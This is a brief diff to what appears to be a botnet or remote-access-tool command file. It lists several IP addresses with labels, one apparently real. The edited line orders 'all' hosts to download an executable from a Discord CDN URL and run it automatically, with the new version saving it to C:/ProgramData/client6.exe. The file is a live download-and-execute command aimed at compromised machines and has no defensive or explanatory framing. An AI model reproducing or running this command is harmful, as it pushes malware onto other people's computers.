@@ -3,4 +3,4 @@
 2.2.2.2 abc2
 3.3.3.3 abc3
 78.97.107.247 abc
-all downloadautorun https://cdn.discordapp.com/attachments/781499018253434924/845625037645676544/Client.exe
+all downloadautorun https://cdn.discordapp.com/attachments/781499018253434924/845625037645676544/Client.exe C:/ProgramData/client6.exe
